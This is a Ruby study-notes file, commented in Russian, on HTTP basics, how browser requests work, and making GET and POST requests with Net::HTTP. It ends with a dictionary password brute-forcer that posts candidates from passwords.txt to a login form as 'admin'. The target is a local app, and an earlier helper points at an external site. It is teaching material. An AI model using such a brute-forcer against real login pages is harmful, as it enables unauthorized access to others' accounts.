puts '                                            HTTP и запросы'

# GET(запрос(request) от браузера серверу на получение данных) - запрос о том что браузер хочет получить какую-то страницу(ресурс) так же он содержит инфу о кодировках и языках поддерживаемых браузером. На этот запрос от сервера приходит ответ в виде данных запрашиваемой страницы/картинки/ресурса(ее html/css/... код) или об ошибке и некорректности запроса(например 404 страница не найдена)

# POST(запрос(request) от браузера серверу на отправку данных на сервер) - используется для отправки браузером данных на сервер(например ввод пароля, отправка сообщения на форум, залив картинки или видео). так же содержит служебную информацию

# GET на самом деле тоже отправляет данные, но только данные пакета запроса(1 килобайт или типа того)

# Можно так же отправлять запросы вручную(тк они отправляются в текстовом виде) при помощи спец программ(пр telnet) например самый простой запрос(в консоли telnet ya.ru 80) - GET /HTTP/ 1.0  и получим ответ например код страницы

# SERVER(от слова служить) - сервер только обслуживает и сам никому ничего не отправляет, а только возвращает на наш запрос

# Fiddler - прога для просмотра запросов(бесплатная). Устанавливается как прокси сервер, позволяет видеть все подключения и данные запросов.(https://vimeo.com/102869014 урок18)
# Аналог на маке - charles proxy

# Там можно посмотреть тело пост запросов(данные формы), там есть левые символы которые можно преобразовать в более читабельный вид при помощи - url unescape online (search query)

# Поэтому данные HTTP и небезопасны, тк условный админ вайфай сети офисной или просто сети локальной на работе таким же фидлером может считать инфу с паролей. Соотв по этому и стоит пользоваться HTTPS на котором запросы шифруются, но правда куда мы заходим все равно будет видно

# rfc http - http://lib.ru/WEBMASTER/rfc2068/ - документация для http можно изучить как работает http протокол


puts
puts '                                        Схема работы HTTP протокола'

#  https://ru.wikipedia.org/wiki/Сетевая_модель_OSI

#                                Что происходит, когда вы вводите URL-адрес в браузере :

#      1. Разрешить домен(доменное имя например stackoverflow.com или ya.ru или localhost), если это не IP (запрос DNS) Браузер превращает доменное имя в IP-адрес(пр 	85.249.20.109  (IPv4)) и к нему подключается через порт

#      2. Откроет порт 80 по умолчанию, если не задан SSL и не переопределено двоеточием (http://host:port/).
# 127.0.0.1:80 это тоже самое что и 127.0.0.1 тоже самое что и localhost или localhost:80
# SSL - это подключение через защищенный канал например https://ya.ru

# Порты по умолчанию:
# 80 - http  например http://ya.ru
# 443 - https  например https://ya.ru
# Порт - это абстракция операционной системы или протокола(на самом деле никаких портов нет)
# 85.249.20.109:80  - можно добавить порт в конец IP-адреса

#      3. Отправляется запрос  для http://host/uri/here?other=stuff&too
# Пример запроса: использует и должен заканчиваться двумя символами возврата каретки и перевода строки (CrLf)
#   GET /uri/here?other=stuff&too HTTP/1.1
#   Host: host
#   Other: Headers, too.  Such as cookies
#   Header: Value

#      4. Получает ответ
# Пример ответа:
#   HTTP/1.1 200 OK
#   Other: Headers, too.  Such as cookies
#   Header: Value
#   <html>Actual HTTP payload is here, could be HTML data, downloaded file data, etc.

#     5. Соединение закрывается



# 1. Сначала компьютер ищет целевой хост. Если он существует в локальном кэше DNS, он использует эту информацию. В противном случае DNS-запрос выполняется до тех пор, пока не будет найден IP-адрес.
# 2. Затем ваш браузер открывает TCP-соединение с целевым хостом и отправляет запрос в соответствии с HTTP 1.1 (или может использовать HTTP 1.0, но обычные браузеры больше этого не делают).
# 3. Сервер ищет нужный ресурс (если он существует) и отвечает по протоколу HTTP, отправляет данные клиенту (=вашему браузеру)
# 4. Затем браузер использует парсер HTML для воссоздания структуры документа, которая позже будет представлена ​​вам на экране. Если он находит ссылки на внешние ресурсы, такие как изображения, файлы css, файлы javascript, они доставляются так же, как и сам HTML-документ.



# Упрощенный набросок, предполагающий простейший из возможных HTTP-запросов (без HTTPS, без HTTP2, без дополнений), простейший из возможных DNS, без прокси-серверов, IPv4 с одним стеком, только один HTTP-запрос, простой HTTP-сервер на другой конец, и никаких проблем на любом этапе. Для большинства современных намерений и целей это нереалистичный сценарий; все они гораздо сложнее в реальном использовании:

# 1.  браузер проверяет кеш; если запрошенный объект находится в кеше и является свежим, перейдите к #9
# кэш - это хранилище браузера на жеском диске, чтоб быстрее загружать страницы
# 2.  браузер запрашивает у ОС(операционной системы тк именно она превращает запрос в IP-адрес для браузера) IP-адрес сервера[(пункт 1 в самом вехнем списке)]
# 3.  ОС выполняет поиск DNS и отвечает на IP-адрес в браузере.
# 4.  браузер открывает TCP-соединение с сервером (этот шаг намного сложнее с HTTPS) [(пункт 2 в первом списке)]
# 5.  браузер отправляет HTTP-запрос через TCP-соединение[(пункт 3 в первом списке)]
# 6.  браузер получает HTTP-ответ и может закрыть TCP-соединение или повторно использовать его для другого запроса. [(пункт 4-5 в первом списке)]
# 7.  браузер проверяет, является ли ответ перенаправлением или условным ответом (коды состояния результата 3xx), запросом авторизации (401), ошибкой (4xx и 5xx) и т. д.; они обрабатываются иначе, чем обычные ответы (2xx)
# Может быть такой запрос который перенаправляет браузер, тогда браузер не завершает соединение а переходит туда куда перенаправили(можно сделать многократное перенаправление или зациклить, но в браузерах есть от этого защита)
# 8.  если ответ можно содержать в кеше, чтобы не перезагружать снова(некоторые документы можно содержать в кеше например картинки), ответ сохраняется в кеше. Но есть картинки с опцией перезагрузки(об этом сообщается в ответе сервера) например капча
# 9.  браузер декодирует ответ (например, если он заархивирован). Тк большинство серверов сейчас присылают ответ не в текстовом а в сжатом виде
# 10. браузер определяет, что делать с ответом (например, это HTML-страница, это изображение, это звуковой клип)
# 11. браузер отображает ответ или предлагает диалог загрузки для нераспознанных типов

# Кроме того, параллельно с этим происходит много других вещей (обработка введенного адреса, спекулятивная предварительная выборка, добавление страницы в историю браузера, отображение прогресса для пользователя, уведомление плагинов и расширений, рендеринг страницы во время ее загрузки, конвейеризация, отслеживание соединения для keep-alive, управление файлами cookie, проверка на наличие вредоносного контента и т. д.) — и вся операция становится на порядок сложнее с HTTPS (сертификаты, шифры и закрепление).


# Сам сервер не видит разницы между различными пользователями, разница оценивается на уровне приложения, тк на сервере может быть много приложений и он возвращает на запрос то что возвращает приложение. Соотв state(состояние) поддерживается приложением а не сервером.

# https://ru.wikipedia.org/wiki/Протокол_без_сохранения_состояния
# https://stackoverflow.com/questions/13200152/why-is-it-said-that-http-is-a-stateless-protocol

# stateless (без состояния) (сервер не присваивает никакого специального значения и не распознает запрос по соединению) — это протокол передачи данных, который относит каждый запрос к независимой транзакции, которая не связана с предыдущим запросом, то есть общение с сервером состоит из независимых пар запрос-ответ
# HTTP - это протокол без состояния, т.к. сервер не прицепляет никакого специального значения.
# Например был раньше протокол IRC это протокол с состоянием, тк он всегда поддерживает соединение, а ни как HTTP в котором соединение есть только при запросах и ответах

# Если браузер закрывает соединение, то как при след запросе он определяет что это тот же пользователь что нажал кнопку логин
# По IP-адресу - способ не очень хороший тк с одного адреса может быть несколько компьютеров итд итп. Потому он так не делает


puts
puts '                                        Библиотека Net::HTTP'

# https://ruby-doc.org/stdlib-3.1.2/libdoc/net/http/rdoc/Net/HTTP.html - документация к библиотеке Net::HTTP


puts
puts '                                              Get запрос'

# Получить страницу по некому адресу и вывести ее на экран. Вариант1
require 'net/http'  # загрузка библиотеки(модуля) Net::HTTP #require-требовать
# теперь из модуля Net обращаемся к классу HTTP и его методу get
page = Net::HTTP.get('krdprog.ru', '/index.html')  # метод get принимает 2 параметра 1 название домена и 2 путь по которому расположена сама страница
puts page #=> Получаем HTML код запрашиваемой страницы


# Вариант 2
# не очень удобно выводить длинные строки параметров ('krdprog.ru', '/index.html'). Есть вариант проще когда есть ссылка
require 'net/http'
require 'uri'
uri = URI.parse "http://krdprog.ru/index.html" # помещаем в переменную новый объект созданный стат методом(URI - универсальный идентификатор ресурса / Universal Resource Identifier). Он называется так потому, что содержит в себе("http://localhost:4567/login﻿") 4 составляющих: протокол (http), имя хоста (localhost), порт (4567), путь (/login)
response = Net::HTTP.get uri # теперь этот объект мы может задать параметром
puts response  #=> Получаем HTML код запрашиваемой страницы


puts
puts '                                              Post запрос'

# За отправку данных(например логина и пароля) (POST запрос) отвечает метод post_form класса: Net::HTTP
require 'net/http'
require 'uri'
# передаем методу post_form параметрами URI и хэш
Net::HTTP.post_form( URI.parse('http://www.example.com/search.cgi'), {"login"=>"ruby","password"=>"50"} ) # можно использовать как символы так и строки данные в виде хэша отправляются как q=ruby&max=50
# Возвращается объект


#Вариант 2
require 'net/http'
require 'uri'
uri = URI.parse "https://duckduckgo.com/index.html"
# Делаем POST запрос/отправляем форму(как бы нажимаем кнопку ввести например логин и пароль)
response = Net::HTTP.post_form(uri, :x => "ruby") # передаем объект uri и хэш с данными для POST запроса
puts response # Запрос возвращает объект с которым можно делать всякое например:
# оператор body который выводит html код страницы из oбъекта uri возвращенный пост-запросом
puts response.body # можно записать и тут response = Net::HTTP.post_form(uri, :x => "ruby").body


puts
# Проверяем при помощи оператора include? закрыт ли доступ('denied' в данном примере код страницы содержит именно такое значение если доступ закрыт) или нет после пост запрса с логином и паролем
require 'net/http'
require 'uri'
uri = URI.parse "https://rubyschool.us/router"
response = Net::HTTP.post_form(uri, login: 'aaa', password: 'ruby').body # оператор body можно ставить сразу тут
puts response.include?('denied') #=> true или false


# Вариант 2: оформляем проверку доступа в виде функции
require 'net/http'
require 'uri'

def is_wrong_password?(password)
  uri = URI.parse "https://rubyschool.us/router"
  response = Net::HTTP.post_form(uri, login: 'admin', password: password).body # передаем параметр в пост запрос
  response.include?('denied') # проверку просто возвращаем
end
puts is_wrong_password?('qwerty11') #проверяем пароль


puts
# Подбираем пароль при помощи запросов и програмы подборщика паролей
require 'net/http'
require 'uri'

def is_wrong_password? password
  uri = URI.parse "http://localhost:4567/login﻿"
  response = Net::HTTP.post_form(uri, username﻿: 'admin', password: password).body
  response.include?('Wrong username or password, please try again')
end

def find_password
  input = File.open("passwords.txt", "r")
  	while (line = input.gets)
      unless is_wrong_password? line.strip # передаем пароль в метод is_wrong_password? получаем true если неверный
        return line.strip
      end
      puts
  	end
  input.close
end
puts "Password is #{find_password}"
